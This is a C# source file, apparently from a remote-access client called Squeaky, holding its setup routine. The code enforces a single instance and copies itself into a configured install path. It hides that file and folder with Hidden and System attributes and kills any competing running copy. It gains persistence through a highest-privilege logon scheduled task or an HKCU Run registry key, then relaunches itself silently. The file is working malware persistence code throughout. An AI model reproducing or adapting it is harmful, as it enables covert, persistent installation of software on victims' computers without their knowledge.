using System;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Reflection;
using System.Security.Principal;
using Microsoft.Win32;

namespace Squeaky.Client
{
    static class Setup
    {
        private static string CurrentLocation = Assembly.GetExecutingAssembly().Location;

        private static void CheckMutex()
        {
            bool mutexCheck;
            var m = new Mutex(true, Settings.MUTEX, out mutexCheck);

            if (!mutexCheck)
                Environment.Exit(1);
        }

        private static void Install()
        {
            if (!Directory.Exists(Path.GetDirectoryName(Settings.INSTALLATION))) Directory.CreateDirectory(Path.GetDirectoryName(Settings.INSTALLATION));

            if (File.Exists(Settings.INSTALLATION))
            {
                try
                {
                    File.Delete(Settings.INSTALLATION);
                }
                catch (Exception ex)
                {
                    if (ex is IOException || ex is UnauthorizedAccessException)
                    {
                        Process[] foundProcesses = Process.GetProcessesByName(Settings.INSTALLNAME);
                        int myPid = Process.GetCurrentProcess().Id;

                        foreach (var prc in foundProcesses)
                        {
                            if (prc.Id == myPid) continue;

                            if (prc.MainModule.FileName != Settings.INSTALLATION) continue;

                            prc.Kill();
                            Thread.Sleep(2000);
                            break;
                        }

                        File.Delete(Settings.INSTALLATION);
                    }
                }
            }

            File.Copy(CurrentLocation, Settings.INSTALLATION);
            File.SetAttributes(Settings.INSTALLATION, File.GetAttributes(Settings.INSTALLATION) | FileAttributes.Hidden | FileAttributes.System);

            if (!string.IsNullOrEmpty(Settings.SUBDIRECTORY))
            {
                DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(Settings.INSTALLATION));
                di.Attributes |= FileAttributes.Hidden | FileAttributes.System;
            }
        }

        private static bool IsAdministrator()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }

        private static void AddToStartup()
        {
            if (IsAdministrator())
            {
                ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
                {
                    Arguments = "/create /tn \"" + Settings.INSTALLNAME + "\" /sc ONLOGON /tr \"" + Settings.INSTALLATION +
                                "\" /rl HIGHEST /f",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                Process p = Process.Start(startInfo);
                p.WaitForExit(1000);
                if (p.ExitCode == 0) return;
            }

            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
            {
                key.SetValue(Settings.INSTALLNAME, "\"" + Settings.INSTALLATION + "\"");
            }
        }

        public static void Start()
        {
            Thread.Sleep(1000); // Just in case this instance is newly installed, wait a moment for the other to exit.
            CheckMutex();

            if (CurrentLocation != Settings.INSTALLATION)
            {
                if (Settings.STARTUP) AddToStartup();

                if (Settings.INSTALL)
                {
                    Install();

                    var startInfo = new ProcessStartInfo
                    {
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        FileName = Settings.INSTALLATION
                    };
                    Process.Start(startInfo);

                    Environment.Exit(2);
                }
            }
        }
    }
}
